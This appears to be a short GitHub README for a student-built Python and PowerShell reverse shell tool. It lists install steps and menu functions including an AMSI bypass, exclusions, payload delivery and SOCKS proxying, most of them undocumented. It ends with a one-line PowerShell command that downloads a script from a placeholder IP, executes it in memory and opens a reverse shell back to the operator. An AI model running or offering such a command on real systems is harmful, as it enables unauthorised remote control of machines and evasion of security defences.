# Introduction

A small reverse shell project that i build during my university intership.

It is written with Python and Powershell. To simply install it:

1.  Clone this repo
2.  ```
    pip install -r requirements.txt
    ```
3.  ```
    chmod +x powerrevshell.py or python3 powerrevshell.py
    ```
## Powerrevshell

Powerrevshell.py comes with several function accesibbile via the "menu" option.

### get - put
The 
### smb-get
### down-file
### load
### amsi-bypass
### exclude
### payload
### socks-start
### socks-stop
### socks
### close


## Rev.ps1

Rev.ps1 is the powershell script to connect back to us.\
To start the reverse shell run the following code on the target machine.

```
(New-Object System.Net.WebClient).DownloadString('http://<IP>/rev.ps1') IEX; Send-Shell -i <IP> -p 9001
```
